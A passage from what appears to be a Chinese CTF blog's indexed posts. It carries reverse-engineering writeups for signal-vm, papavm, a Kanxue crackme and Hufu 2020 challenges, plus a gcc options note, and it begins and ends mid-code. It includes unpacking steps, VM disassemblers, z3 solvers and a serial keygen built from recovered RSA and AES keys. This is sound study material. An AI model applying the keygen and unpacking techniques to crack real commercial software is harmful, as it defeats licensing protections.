print(op) # 根据sig和opcode进行翻译 if int(sig, 16) == 4: if op.const == 1: f.write(mov_ins[op.const] % (i, op.src, op.final)) else: f.write(mov_ins[op.const] % (i, op.src, op.dest)) elif int(sig, 16) == 5: if op.const == 1: f.write(str_ops[1] % (i, ops[op.val1], op.src, op.final)) else: f.write(str_ops[0] % (i, ops[op.val1], op.src, op.dest)) elif int(sig, 16) == 8: if op.src == 1: f.write(\"%d: cmp r%d0x%x\\n\" % (i, op.dest, op.final2)) else: f.write(\"%d: cmp r%dr%d\\n\" % (i, op.dest, op.final2 \u0026 0xff)) elif int(sig, 16) == 0xb: f.write(\"%d: jmp %s0x%x\\n\" % (i, jmp[op.src], op.dest)) else: print(\"Error\") gdb.execute(\"c\") i = i + 1 f.close() 在2.5.60版Linux内核及以后，GDB对使用fork/vfork创建子进程的程序提供了follow-fork-mode选项来支持多进程调试。 follow-fork-mode的用法为：set follow-fork-mode [parent|child] parent: fork之后继续调试父进程，子进程不受影响。 child: fork之后调试子进程，父进程不受影响。 因此如果需要调试子进程，在启动gdb后： (gdb) set follow-fork-mode child ","date":"2020-05-01","objectID":"/de1ctf2019-signal-vm/:1:4","tags":null,"title":"De1CTF2019-signal-vm","uri":"/de1ctf2019-signal-vm/"},{"categories":["writeup"],"content":"signal vm delta delta版本除了加入写子进程的内存之外，算法也更加复杂。 #include \u003csys/ptrace.h\u003e long int ptrace(enum __ptrace_request request, pid_t pid, void * addr, void * data) PTRACE_PEEKTEXT 1 PTRACE_POKETEXT 4 PTRACE_SETREGS 13 PTRACE_CONT 7 PTRACE_KILL 8 PTRACE_GETREGS 12 PTRACE_TRACEME 0 每个request的详细信息文档: http://godorz.info/2011/02/process-tracing-using-ptrace/ ","date":"2020-05-01","objectID":"/de1ctf2019-signal-vm/:2:0","tags":null,"title":"De1CTF2019-signal-vm","uri":"/de1ctf2019-signal-vm/"},{"categories":["writeup"],"content":"参考链接 https://blog.bi0s.in/2019/08/08/RE/Linux/de1ctf19-signal-vm/ https://blog.bi0s.in/2019/08/09/RE/Linux/de1ctf19-signal-vm-de1ta/ ","date":"2020-05-01","objectID":"/de1ctf2019-signal-vm/:3:0","tags":null,"title":"De1CTF2019-signal-vm","uri":"/de1ctf2019-signal-vm/"},{"categories":["writeup"],"content":"脱壳 是一个UPX的壳，程序中把UPX换成了ZOB，所以直接用upx -d无法脱壳，将ZOB替换成UPX后就可以直接使用upx -d脱壳。 ","date":"2020-04-28","objectID":"/inshack-2019-papavm/:1:0","tags":null,"title":"InsHack-2019-papavm","uri":"/inshack-2019-papavm/"},{"categories":["writeup"],"content":"first step 脱壳后的程序仍然是一个静态链接去符号表的程序，关键代码部分如下: unsigned __int64 __usercall sub_401C4C@\u003crax\u003e(__int64 a1@\u003crbx\u003e, __int64 a2@\u003cr12\u003e, double a3@\u003cxmm0\u003e, double a4@\u003cxmm1\u003e, double a5@\u003cxmm2\u003e, double a6@\u003cxmm3\u003e, double a7@\u003cxmm6\u003e, double a8@\u003cxmm7\u003e) { double v8; // xmm4_8 double v9; // xmm5_8 unsigned __int64 result; // rax signed int v11; // [rsp+0h] [rbp-40280h] signed int v12; // [rsp+4h] [rbp-4027Ch] signed int v13; // [rsp+8h] [rbp-40278h] int v14; // [rsp+Ch] [rbp-40274h] char v15[262760]; // [rsp+10h] [rbp-40270h] unsigned __int64 v16; // [rsp+40278h] [rbp-8h] __int64 savedregs; // [rsp+40280h] [rbp+0h] v16 = __readfsqword(0x28u); v11 = 0; v12 = 0; v13 = 0; v14 = 0; while ( v11 != 1 || v12 != 1 ) { if ( v13 \u003e 131376 ) v11 = 1; else v15[v14++] = byte_4A80C0[v13]; if ( v13 \u003e 131376 ) v12 = 1; else v15[v14++] = byte_4C8200[v13]; ++v13; } sub_401B55(v15, 97, a1, a2, a3, a4, a5, a6, a7, a8); result = __readfsqword(0x28u) ^ v16; if ( result ) sub_4405C0(a1, (__int64)\u0026savedregs, a2, a3, a4, a5, a6, v8, v9, a7, a8); return result; } __int64 __usercall sub_401B55@\u003crax\u003e(const char *a1@\u003crdi\u003e, char a2@\u003csil\u003e, __int64 a3@\u003crbx\u003e, __int64 a4@\u003cr12\u003e, double a5@\u003cxmm0\u003e, double a6@\u003cxmm1\u003e, double a7@\u003cxmm2\u003e, double a8@\u003cxmm3\u003e, double a9@\u003cxmm6\u003e, double a10@\u003cxmm7\u003e) { unsigned int fd; // ST18_4 unsigned int v11; // ST1C_4 size_t count; // ST00_8 double v13; // xmm4_8 double v14; // xmm5_8 __int64 result; // rax double v16; // xmm4_8 double v17; // xmm5_8 char *v18; // [rsp+20h] [rbp-30h] __int64 v19; // [rsp+28h] [rbp-28h] char filename[8]; // [rsp+39h] [rbp-17h] unsigned __int64 v21; // [rsp+48h] [rbp-8h] __int64 savedregs; // [rsp+50h] [rbp+0h] v21 = __readfsqword(0x28u); strcpy(filename, \"/tmp/fooXXXXXX\"); fd = mkostemp((__int64 *)filename, 1, (const char *)a4, a5, a6, a7, a8, a9, a10); chmod(filename, 320LL); v11 = open(filename, 0, a2); unlink(filename); write(fd, a1, count); close(fd); v18 = filename; v19 = 0LL; fexecve(v11, (const char *)\u0026v18, qword_4EB7C0, a3, (const char *)\u0026savedregs, a5, a6, a7, a8, v13, v14, a9, a10); result = sub_4093A0(\"ERROR\"); if ( __readfsqword(0x28u) != v21 ) sub_4405C0(a3, (__int64)\u0026savedregs, a4, a5, a6, a7, a8, v16, v17, a9, a10); return result; } 在sub_401C4C中得到v15数组，在sub_401B55中将数组写入/tmp/fooXXXXXX后执行，将这个数组的值dump出来可以得到另一个可执行文件 ","date":"2020-04-28","objectID":"/inshack-2019-papavm/:2:0","tags":null,"title":"InsHack-2019-papavm","uri":"/inshack-2019-papavm/"},{"categories":["writeup"],"content":"second step 第二层可执行文件的主要代码 unsigned __int64 sub_1499() { size_t v0; // rax void *v1; // rsp size_t v2; // rax size_t v3; // rbx size_t v5; // [rsp+0h] [rbp-70h] __int64 v6; // [rsp+8h] [rbp-68h] int i; // [rsp+14h] [rbp-5Ch] int v8; // [rsp+18h] [rbp-58h] int v9; // [rsp+1Ch] [rbp-54h] time_t timer; // [rsp+20h] [rbp-50h] struct tm *v11; // [rsp+28h] [rbp-48h] char *s; // [rsp+30h] [rbp-40h] size_t v13; // [rsp+38h] [rbp-38h] const char *v14; // [rsp+40h] [rbp-30h] unsigned __int64 v15; // [rsp+48h] [rbp-28h] v15 = __readfsqword(0x28u); time(\u0026timer); v11 = localtime(\u0026timer); v8 = v11-\u003etm_sec; v9 = 7; s = \"SBVZYBVFMVYLAZHTLOATHP\"; v0 = strlen(\"SBVZYBVFMVYLAZHTLOATHP\"); v13 = v0 - 1; v5 = v0; v6 = 0LL; v1 = alloca(16 * ((v0 + 15) / 0x10)); v14 = (const char *)\u0026v5; for ( i = 0; ; ++i ) { v3 = i; if ( v3 \u003e= strlen(s) ) break; v2 = strlen(s); v14[i] = s[v2 - i - 1]; // 逆序 } sub_11F9((__int64)v14, v9); sub_13B1(v14); return __readfsqword(0x28u) ^ v15; } __int64 __fastcall sub_11F9(__int64 a1, char a2) { __int64 result; // rax char v3; // [rsp+17h] [rbp-5h] char v4; // [rsp+17h] [rbp-5h] char v5; // [rsp+17h] [rbp-5h] int i; // [rsp+18h] [rbp-4h] for ( i = 0; ; ++i ) { result = *(unsigned __int8 *)(i + a1); if ( !(_BYTE)result ) break; v3 = *(_BYTE *)(i + a1); if ( v3 \u003c= 0x60 || v3 \u003e 0x7A ) // not a-z { if ( v3 \u003e 0x40 \u0026\u0026 v3 \u003c= 0x5A ) // A-Z { v5 = v3 - a2; // -9 if ( v5 \u003c= 0x40 ) v5 += 26; // 凯撒密码，左移7 *(_BYTE *)(a1 + i) = v5; } } else { v4 = v3 - a2; if ( v4 \u003c= 96 ) v4 += 26; *(_BYTE *)(a1 + i) = v4; } } return result; } unsigned __int64 __fastcall sub_13B1(const char *a1) { int v2; // [rsp+18h] [rbp-3CA08h] signed int i; // [rsp+1Ch] [rbp-3CA04h] char v4[248296]; // [rsp+20h] [rbp-3CA00h] unsigned __int64 v5; // [rsp+3CA08h] [rbp-18h] v5 = __readfsqword(0x28u); v2 = 0; for ( i = 0; i \u003c= (signed int)\u0026unk_3C9E0; ++i ) { v4[i] = a1[v2++] ^ byte_40A0[i]; if ( v2 == strlen(a1) ) v2 = 0; } sub_12BA(v4, (size_t)\u0026unk_3C9E1); return __readfsqword(0x28u) ^ v5; } 相似的套路，密钥是SBVZYBVFMVYLAZHTLOATHP逆序后左移7然后与byte_40A0异或，dump出以后是真正的vm ","date":"2020-04-28","objectID":"/inshack-2019-papavm/:3:0","tags":null,"title":"InsHack-2019-papavm","uri":"/inshack-2019-papavm/"},{"categories":["writeup"],"content":"vm // 指令结构 struct insn_t { signed op: 8; /* opcode */ signed op1: 8; /* destination register */ signed op2: 8; /* source register */ signed dd: 8; /* unused */ }; vm解析(之前一直用input代入的方式太傻了…) #coding = utf-8 def print_ins(offset, op, arg1=\"\", arg2=\"\"): # print(op) print(\"{:0\u003e3x} {:^5s} {:^8s} {:^8s}\".format(offset, op, arg1, arg2)) def deal_data(d): a = hex(d).strip('0x') b = a.zfill(7) c = b[::-1] return int(c, 16) if __name__ == \"__main__\": data = [513, 769, 263937, 67585, 393986, 2307, 1028, 66820, 328712, 262661, 458757, 524549, 525061, 63238, 519] pc = 0 print_ins(0, \"load\", \"R0\", \"arg[]\") print_ins(0, \"mov\", \"R1\", \"input\") print_ins(0, \"mov\", \"R6\", \"length\") while pc \u003c len(data): d = data[pc] ins = deal_data(d) opn = ins \u003e\u003e 24 op1 = (ins \u003e\u003e 16) \u0026 0xff op2 = (ins \u003e\u003e 8) \u0026 0xff if opn == 1: op = \"mov\" arg1 = \"R%d\"%op1 arg2 = str(op2) print_ins(pc, op, arg1, arg2) elif opn == 2: op = \"cmp\" arg1 = \"R%d\"%op1 arg2 = \"R%d\"%op2 print_ins(pc, op, arg1, arg2) op = \"setz\" print_ins(pc, op, \"R10\") elif opn == 3: op = \"cmp\" arg1 = \"R10\" print_ins(pc, op, arg1, \"1\") op = \"jz\" arg1 = hex(pc + op1) print_ins(pc, op, arg1) elif opn == 4: op = \"load\" arg1 = \"R%d\"%op1 arg2 = \"R%d\"%op2 print_ins(pc, op, arg1, arg2) elif opn == 5: op = \"add\" arg1 = \"R%d\"%op1 arg2 = \"R%d\"%op2 print_ins(pc, op, arg1, arg2) elif opn == 6: op = \"jmp\" arg1 = hex((pc + op1) % (len(data)+1)) print_ins(pc, op, arg1) elif opn == 7: op = \"ret\" arg1 = \"R%d\"%op1 print_ins(pc, op, arg1) elif opn == 8: op = \"mul\" arg1 = \"R%d\"%op1 arg2 = \"R%d\"%op2 print_ins(pc, op, arg1, arg2) pc = pc + 1 解析后的指令 000 load R0 arg[] 000 mov R1 input 000 mov R6 length 000 mov R2 0 001 mov R3 0 002 mov R7 4 003 mov R8 1 004 cmp R3 R6 004 setz R10 005 cmp R10 1 005 jz 0xe 006 load R4 R0 007 load R5 R1 008 mul R4 R5 009 add R2 R4 00a add R0 R7 00b add R1 R8 00c add R3 R8 00d jmp 0x4 00e ret R2 arg[]数组是[31, 31x31, 31x31x31, ...] ","date":"2020-04-28","objectID":"/inshack-2019-papavm/:4:0","tags":null,"title":"InsHack-2019-papavm","uri":"/inshack-2019-papavm/"},{"categories":["writeup"],"content":"solve z3求解(是参考链接中wp里面的，懒得再写一个了，记录一下) #!/usr/bin/python from z3 import * def work(size): b = [BitVec('%d' % i, 8) for i in xrange(size)] s = Solver() t = BitVecVal(0, 64) p = BitVecVal(1, 32) s.add(b[-1] == 10) #换行符，因为用的fgets读取 for i in xrange(size): p *= 31 t += SignExt(32, p)*SignExt(56, b[i]) s.add(t == 0xffffffc8b0eb3225) if s.check() == sat: flag = \"\" ans = s.model() for i in b: flag += chr(ans[i].as_long()) print \"[*] Found:\", flag.encode(\"base64\") i = 1 while i \u003c 45: work(i) i += 1 但是这个题不需要用z3求出真正的flag，上面程序的任意一个输出都可以输入返回正确，然后需要连接服务器获取flag #!/usr/bin/python from pwn import * p = process('./papavm') sd=lambda x:p.send(x) sl=lambda x:sd(x+'\\n') sda=lambda x,y:p.sendafter(x,y) sla=lambda x,y:sda(x,y+'\\n') ru=lambda x:p.recvuntil(x) rv=lambda x:p.recv(x) io=lambda :p.interactive() ps=lambda :pause() rv(1024) sl(\"\") rv(1024) sl(\"launch\") s = \"lxFXLH7HnQo=\" sl(s.decode(\"base64\")) print rv(1024) p.close() 也可以直接用echo \"lxFXLH7HnQo=\" | base64 -d | ssh -p 2231 user@papavm.ctf.insecurity-insa.fr ","date":"2020-04-28","objectID":"/inshack-2019-papavm/:5:0","tags":null,"title":"InsHack-2019-papavm","uri":"/inshack-2019-papavm/"},{"categories":["writeup"],"content":"参考链接 https://x0r19x91.github.io/2019/2019-05-06-inshack-papavm/ https://github.com/InsecurityAsso/inshack-2019/blob/ab25eaa9ee/papavm/writeup.md ","date":"2020-04-28","objectID":"/inshack-2019-papavm/:6:0","tags":null,"title":"InsHack-2019-papavm","uri":"/inshack-2019-papavm/"},{"categories":["notes"],"content":"编译流程 gcc、g++分别是gnu的c、c++编译器，gcc/g++在执行编译工作的时候，总共需要4步: 预处理： 生成预处理文件，后缀名 .i (预处理器cpp) 编译： 预处理后的文件编译生成汇编语言文件，后缀名 .s(编译器egcs) 汇编： 汇编语言文件汇编生成目标代码(机器代码)文件，后缀名.o (汇编器as) 链接： 链接目标代码, 生成可执行文件 (链接器ld) 源码从前端经过词法分析、语法分析/语义分析之后生成AST/GENERIC，再转换成GIMPLE中间表示，GCC还需要对GIMPLE进行低级化、IPA处理等，再转成SSA优化后生成RTL，最终才生成汇编代码，整个过程如下： gcc编译系统主要由三部分组成：与语言相关的前端、与语言无关的后端、与机器相关的机器描述 GCC的优化流程主要是: 编译器首先从编译命令行中解析出优化参数，经过语法分析器将源程序翻译成等价的AST(抽象语法树)形式； 再由中间代码生成器将AST转换为RTL(Register transfer language)；然后由优化器根据解析出的优化参数实施相应的优化策略；最后由代码生成器读入优化后的RTL并生成可执行机器码予以输出。事实上,GCC的优化绝大部分都是在RTL这个层次上实施的。 ","date":"2020-04-25","objectID":"/%E6%AF%8F%E6%97%A5%E6%80%BB%E7%BB%93-%E7%AC%AC%E4%BA%8C%E5%8D%81%E4%BA%8C%E5%A4%A9-gcc/:1:0","tags":null,"title":"gcc详解","uri":"/%E6%AF%8F%E6%97%A5%E6%80%BB%E7%BB%93-%E7%AC%AC%E4%BA%8C%E5%8D%81%E4%BA%8C%E5%A4%A9-gcc/"},{"categories":["notes"],"content":"参数详解 -x: gcc -x language filename 设定文件所使用的语言, 使后缀名无效, 对以后的多个有效。language可以是：c, objective-c, c-header, c++, cpp-output, assembler, assembler-with-cpp eg: gcc -x c test.png language为none时表示自动识别语言 -c: 只激活预处理,编译,和汇编,也就是他只把程序做成obj文件 eg: gcc -c test.c只生成.obj文件 -S 只激活预处理和编译，就是指把文件编译成为汇编代码。 -E 只激活预处理,这个不生成文件, 你需要把它重定向到一个输出文件里面 gcc -E test.c \u003e test.txt -ansi 使用-ansi参数可以支持 ISO C89风格。 比如下面的代码: #include\u003cstdio.h\u003e int main(void) { // Print the string printf(\"\\nThe Geek Stuff\\n\"); return 0; } 使用-ansi参数编译上面的代码会出错，因为ISO C89不支持C++风格的注释。 -fno-asm 此选项实现ansi选项的功能的一部分，它禁止将asm,inline和typeof用作关键字。 -include file 包含某个代码，简单来说，就是当某个文件需要另一个文件的时候，就可以用它设定，功能就相当于在代码中使用#include eg： gcc hello.c -include /root/pianopan.h -Idir 在你使用#include “file\"的时候，gcc/g++会先在当前目录查找你所指定的头文件，如果没有找到，他会到缺省的头文件目录找，如果使用-I指定了目录，他会先在你所指定的目录查找，然后再按常规的顺序去找。对于#include , gcc/g++会到-I指定的目录查找，查找不到，然后将到系统的缺省的头文件目录查找。 -I- 就是取消前一个参数的功能,所以一般在-Idir之后使用 -idirafter dir 在-I的目录里面查找失败，将到这个目录里面查找。 -iprefix prefix，-iwithprefix dir 一般一起使用，当-I的目录查找失败，会到prefix+dir下查找 -nostdinc 使编译器不在系统缺省的头文件目录里面找头文件，一般和-I联合使用，明确限定头文件的位置 -nostdinc++ 规定不在g++指定的标准路经中搜索，但仍在其他路径中搜索，此选项在创建libg++库使用 -C 在预处理的时候,不删除注释信息，一般和-E一起使用，有时候分析程序，用这个很方便的 -M 生成文件关联的信息。包含目标文件所依赖的所有源代码 test.o: test.c /usr/include/stdc-predef.h /usr/include/stdio.h \\ /usr/include/x86_64-linux-gnu/bits/libc-header-start.h \\ /usr/include/features.h /usr/include/x86_64-linux-gnu/sys/cdefs.h \\ /usr/include/x86_64-linux-gnu/bits/wordsize.h \\ /usr/include/x86_64-linux-gnu/bits/long-double.h \\ /usr/include/x86_64-linux-gnu/gnu/stubs.h \\ /usr/include/x86_64-linux-gnu/gnu/stubs-64.h \\ /usr/lib/gcc/x86_64-linux-gnu/8/include/stddef.h \\ /usr/lib/gcc/x86_64-linux-gnu/8/include/stdarg.h \\ /usr/include/x86_64-linux-gnu/bits/types.h \\ /usr/include/x86_64-linux-gnu/bits/typesizes.h \\ /usr/include/x86_64-linux-gnu/bits/types/__fpos_t.h \\ /usr/include/x86_64-linux-gnu/bits/types/__mbstate_t.h \\ /usr/include/x86_64-linux-gnu/bits/types/__fpos64_t.h \\ /usr/include/x86_64-linux-gnu/bits/types/__FILE.h \\ /usr/include/x86_64-linux-gnu/bits/types/FILE.h \\ /usr/include/x86_64-linux-gnu/bits/types/struct_FILE.h \\ /usr/include/x86_64-linux-gnu/bits/stdio_lim.h \\ /usr/include/x86_64-linux-gnu/bits/sys_errlist.h -MM 和上面的那个一样，但是它将忽略由#include造成的依赖关系。 -MD 和-M相同，但是输出将导入到.d的文件里面 -MMD和-MM相同，但是输出将导入到.d的文件里面 -Wa,option 此选项传递option给汇编程序；如果option中间有逗号，就将option分成多个选项，然后传递给汇编程序 -Wl.option 此选项传递option给链接程序；如果option中间有逗号，就将option分成多个选项，然后传递给链接程序. -llibrary 指定编译的时候使用的库 例如： gcc -lcurses hello.c -Ldir 指定编译的时候，搜索库的路径。如果不指定，编译器将只在标准库的目录找。 -O0，-O1，-O2，-O3 编译器的优化选项的4个级别，-O0表示没有优化，-O1为缺省值，-O3优化级别最高 -g 指示编译器，在编译的时候，产生调试信息。 -gstabs 此选项以stabs格式生成调试信息，但是不包括gdb调试信息 -gstabs+此选项以stabs格式生成调试信息，并且包含仅供gdb使用的额外调试信息。 -ggdb 此选项将尽可能的生成gdb可以使用的调试信息。 -static 此选项将禁止使用动态库。 -share 此选项将尽量使用动态库。 -traditional 试图让编译器支持传统的C语言特性 -w 不生成任何警告信息。默认选项 -Wall 开启大多数警告 使用-fPIC产生位置无关的代码 当产生共享库的时候，应该创建位置无关的代码，这会让共享库使用任意的地址而不是固定的地址，要实现这个功能，需要使用-fPIC参数。 下面的例子产生libCfile.so动态库。 $ gcc -c -Wall -Werror -fPIC Cfile.c $ gcc -shared -o libCfile.so Cfile.o -D 可以用作定义编译时的宏。 #include\u003cstdio.h\u003e int main(void) { #ifdef MY_MACRO printf(\"\\nMacro defined \\n\"); #endif char c = -10; // Print the string printf(\"\\nThe Geek Stuff [%d]\\n\", c); return 0; } -D可以用作从命令行定义宏MY_MACRO。 $ gcc -Wall -DMY_MACRO main.c -o main $ ./main Macro defined The Geek Stuff [-10] 使用@参数从文件中读取参数 $ cat opt_file -Wall -omain # opt_file包含编译参数 $ gcc main.c @opt_file main.c: In function ‘main’: main.c:6:11: warning: ‘i’ is used uninitialized in this function [-Wuninitialized] 指定支持的c++/c的标准 gcc -std=c++11 hello-world.cpp 标准如 c++11, c++14, c90, c89等。 使用-static生成静态链接的文件 静态编译文件(把动态库的函数和其它依赖都编译进最终文件) gcc main.c -static -o main -lpthread 相反的使用-shared使用动态库链接 ","date":"2020-04-25","objectID":"/%E6%AF%8F%E6%97%A5%E6%80%BB%E7%BB%93-%E7%AC%AC%E4%BA%8C%E5%8D%81%E4%BA%8C%E5%A4%A9-gcc/:2:0","tags":null,"title":"gcc详解","uri":"/%E6%AF%8F%E6%97%A5%E6%80%BB%E7%BB%93-%E7%AC%AC%E4%BA%8C%E5%8D%81%E4%BA%8C%E5%A4%A9-gcc/"},{"categories":["writeup"],"content":"第二题 子鼠开天 ","date":"2020-04-21","objectID":"/%E7%9C%8B%E9%9B%AA2020-%E7%AC%AC%E4%BA%8C%E9%A2%98/:1:0","tags":null,"title":"看雪2020-第二题","uri":"/%E7%9C%8B%E9%9B%AA2020-%E7%AC%AC%E4%BA%8C%E9%A2%98/"},{"categories":["writeup"],"content":"算法识别 从字符串信息可知，文件用了openssl_0.9.8这个库，导入相应版本的sig文件后可以识别部分代码 openssl_0.9.8.sig 其他没有识别出来的函数可以通过固定参数或者对比openssl源码识别 sub_4019B0 -\u003e sha512 (0xF3BCC908, 0x6A09E667…) sub_401560 -\u003e md5 (0x67452301, 0xEFCDAB89…) sub_404FE0 -\u003e AES_set_encrypt_key sub_4053A0 -\u003e AES_set_decrypt_key sub_sub_4010F0 -\u003e 最后一个参数为1是是AES加密，为0时是AES解密 sub_401210 -\u003e rsa ","date":"2020-04-21","objectID":"/%E7%9C%8B%E9%9B%AA2020-%E7%AC%AC%E4%BA%8C%E9%A2%98/:1:1","tags":null,"title":"看雪2020-第二题","uri":"/%E7%9C%8B%E9%9B%AA2020-%E7%AC%AC%E4%BA%8C%E9%A2%98/"},{"categories":["writeup"],"content":"加密过程 sn：AES解密 -\u003e RSA加密 name: sha512 -\u003e md5 -\u003e sha512 -\u003e md5 sn加密结果的后16字节与nams计算hash后的16字节相等且sn的前两个字节为0002，第16个字节为0 ","date":"2020-04-21","objectID":"/%E7%9C%8B%E9%9B%AA2020-%E7%AC%AC%E4%BA%8C%E9%A2%98/:1:2","tags":null,"title":"看雪2020-第二题","uri":"/%E7%9C%8B%E9%9B%AA2020-%E7%AC%AC%E4%BA%8C%E9%A2%98/"},{"categories":["writeup"],"content":"solve #coding=utf-8 import gmpy2 import hashlib from Crypto.Cipher import AES import base64 import math from binascii import b2a_hex, a2b_hex class prpcrypt(): def __init__(self): s = \"480b62c3acd6c8a36b18d9e906cd90d2\" self.key = s.decode('hex') self.mode = AES.MODE_ECB def encrypt(self, text): cryptor = AES.new(self.key, self.mode) length = 16 count = len(text) if count % length != 0: add = length - (count % length) else: add = 0 text = text + ('\\0' * add) self.ciphertext = cryptor.encrypt(text) return b2a_hex(self.ciphertext) def decrypt(self, text): cryptor = AES.new(self.key, self.mode) plain_text = cryptor.decrypt(a2b_hex(text)) return plain_text.rstrip('\\0') n = 0x69823028577465ab3991df045146f91d556dee8870845d8ee1cd3cf77e4a0c39 p = 201522792635114097998567775554303915819 q = 236811285547763449711675622888914229291 phi = (p - 1) * (q - 1) e = 65537 d = gmpy2.invert(e, phi) x = 0x02000000000000000000000000000014af58ad4d76d59d8d2171ffb4ca2231 msg = hex(pow(x,d,n)).strip('L')[2:] pr = prpcrypt() c1 = pr.encrypt(msg[:32].decode('hex')) c2 = pr.encrypt(msg[32:64].decode('hex')) print c1+c2 ","date":"2020-04-21","objectID":"/%E7%9C%8B%E9%9B%AA2020-%E7%AC%AC%E4%BA%8C%E9%A2%98/:1:3","tags":null,"title":"看雪2020-第二题","uri":"/%E7%9C%8B%E9%9B%AA2020-%E7%AC%AC%E4%BA%8C%E9%A2%98/"},{"categories":["writeup"],"content":"game 根据python的反汇编代码可以得到下面的逻辑： check0 每个字符为32 - 128 check1(s): len(s) \u003c 100 \u0026\u0026 (len * len % 777) ^ 233 == 513 \u003e len(s) = 39 check2(s): ((s[0]*128 + s[1])) * 128) + s[2]…s[5]=3533889469877 -\u003e s[5]=‘5’ check3: arr = map(ord(s)) a = arr[slice(6, 30, 3)] for i in range(len(a)) (a[i]*17684 + 372511)% 257 == arr0[i] b = arr[slice(-2, 33, -1)] * 5 c = map(lambda x[0] ^ x[1], zip(b, arr[slice(7, 27)])) if c != arr1: p = 0 for i in range(28, 34): (arr[i] + 107) / 16 + 77 == arr2[p] (arr[i] + 117) % 16 + 99 == arr2[p + 1] p = p + 2 arr0 = [249, 91, 149, 113, 16, 91, 53, 41] arr1 = [43, 1, 6, 69, 20, 62, 6, 44, 24, 113, 6, 35, 0, 3, 6, 44, 20, 22, 127, 60] arr2 = [90, 100, 87, 109, 86, 108, 86, 105, 90, 104, 88, 102] flag6_30_3 = [] for i in range(len(arr0)): for t in range(32, 128): if (t*17684 + 372511)% 257 == arr0[i]: flag6_30_3.append(chr(t)) continue flag_35 = chr(arr1[2] ^ ord(flag6_30_3[1])) flag_36 = chr(arr1[5] ^ ord(flag6_30_3[2])) flag_37 = chr(arr1[8] ^ ord(flag6_30_3[3])) flag_34 = chr(arr1[11] ^ ord(flag6_30_3[4])) b = [ord(flag_37), ord(flag_36), ord(flag_35), ord(flag_34)] * 5 flag_7_27 = [] for i in range(len(arr1)): flag_7_27.append(chr(b[i] ^ arr1[i])) flag_28_34 = [] p = 0 for i in range(28, 34): for t in range(32, 128): if (t + 107) / 16 + 77 == arr2[p] and (t + 117) % 16 + 99 == arr2[p + 1]: flag_28_34.append(chr(t)) continue p = p + 2 s1 = \"\".join(i for i in flag_7_27) s2 = \"\".join(i for i in flag_28_34) s3 = \"\".join([flag_34, flag_35,flag_36,flag_37]) flag = 'flag{5'+flag6_30_3[0]+s1+flag6_30_3[-2]+s2+s3+'}' print flag ","date":"2020-04-20","objectID":"/%E8%99%8E%E7%AC%A62020%E9%83%A8%E5%88%86re/:1:0","tags":null,"title":"虎符2020部分re","uri":"/%E8%99%8E%E7%AC%A62020%E9%83%A8%E5%88%86re/"},{"categories":["writeup"],"content":"vm 是个逻辑很清楚的vm，但是wtcl比赛时间对我来说有点短不够我翻译的…后面才做出来的，根据逻辑写出parser def parser(code): f = open('opcode.txt', 'w') pc = 0 ins = 40 stack = [] reg = [0]*4 store = [0]*300 while pc \u003c len(code): c = code[pc] if c == 1: f.write(\"push inputc \") stack.append(ins) f.write(\"--\u003e now stack:\" + str(stack)+'\\n') pc = pc + 1 elif c == 2: f.write(\"pop --\u003e \") f.write(\"outputc %d\"%stack[-1]) f.write(\"--\u003e now stack:\" + str(stack)+'\\n') print store del stack[-1] pc = pc + 1 elif c == 3: f.write(\"nop\") pc = pc + 1 elif c == 4: f.write(\"push %d\"%code[pc+1]) stack.append(code[pc + 1]) f.write(\"--\u003e now stack:\" + str(stack)+'\\n') pc += 2 elif c == 5: f.write(\"push reg[%d] \"%code[pc+1]) stack.append(reg[code[pc+1]]) f.write(\"--\u003e now stack:\" + str(stack)+'\\n') pc += 2 elif c == 6: f.write(\"pop reg[%d] \"%(code[pc+1])) reg[code[pc+1]] = stack[-1] del stack[-1] f.write(\"--\u003e now stack:\" + str(stack)+'\\n') pc += 2 elif c == 7: f.write(\"push store[%d]\"%(code[pc+1])) stack.append(store[code[pc+1]]) f.write(\"--\u003e now stack:\" + str(stack)+'\\n') pc = pc + 2 elif c == 8: f.write(\"pop store[%d]\"%(code[pc+1])) store[code[pc+1]] = stack[-1] del stack[-1] f.write(\"--\u003e now stack:\" + str(stack)+'\\n') pc = pc + 2 elif c == 9: f.write(\"add\") a = stack[-1] b = stack[-2] del stack[-1] del stack[-1] stack.append((a+b)\u00260xff) f.write(\"--\u003e now stack:\" + str(stack)+'\\n') pc = pc + 1 elif c == 0xa: f.write(\"sub\") a = stack[-1] b = stack[-2] del stack[-1] del stack[-1] stack.append((b-a)\u00260xff) f.write(\"--\u003e now stack:\" + str(stack)+'\\n') pc = pc + 1 elif c == 0xb: f.write(\"mul\") a = stack[-1] b = stack[-2] del stack[-1] del stack[-1] stack.append((a*b)\u00260xff) f.write(\"--\u003e now stack:\" + str(stack)+'\\n') pc = pc + 1 elif c == 0xc: f.write(\"div\") a = stack[-1] b = stack[-2] del stack[-1] del stack[-1] stack.append((b/a)\u00260xff) f.write(\"--\u003e now stack:\" + str(stack)+'\\n') pc = pc + 1 elif c == 0xd: f.write(\"mod\") a = stack[-1] b = stack[-2] del stack[-1] del stack[-1] stack.append(b%a) f.write(\"--\u003e now stack:\" + str(stack)+'\\n') pc = pc + 1 elif c == 0xe: f.write(\"xor\") a = stack[-1] b = stack[-2] del stack[-1] del stack[-1] stack.append(b ^ a) f.write(\"--\u003e now stack:\" + str(stack)+'\\n') pc = pc + 1 elif c == 0xf: f.write(\"and\") a = stack[-1] b = stack[-2] del stack[-1] del stack[-1] stack.append(b\u0026a) f.write(\"--\u003e now stack:\" + str(stack)+'\\n') pc = pc + 1 elif c == 0x10: f.write(\"or\") a = stack[-1] b = stack[-2] del stack[-1] del stack[-1] stack.append(b | a) f.write(\"--\u003e now stack:\" + str(stack)+'\\n') pc = pc + 1 elif c == 0x11: f.write(\"-\") a = stack[-1] del stack[-1] stack.append((-a)\u00260xff) f.write(\"--\u003e now stack:\" + str(stack)+'\\n') pc += 1 elif c == 0x12: f.write(\"~\") a = stack[-1] del stack[-1] stack.append((~a)\u00260xff) f.write(\"--\u003e now stack:\" + str(stack)+'\\n') pc += 1 elif c == 0x13: a = stack[-2] b = stack[-1] del stack[-1] del stack[-1] f.write(\"cmp\") if a != b: f.write(\"not equal, go on\") f.write(\"--\u003e now stack:\" + str(stack)+'\\n') pc = pc + 2 else: f.write(\"equal, jmp\") f.write(\"--\u003e now stack:\" + str(stack)+'\\n') if code[pc+1] \u003c= 0x7f: pc = pc + code[pc+1] else: pc = pc - (256 - code[pc + 1]) elif c == 0x14: a = stack[-2] b = stack[-1] del stack[-1] del stack[-1] f.write(\"cmp\") if a == b: f.write(\"equal, go on\") f.write(\"--\u003e now 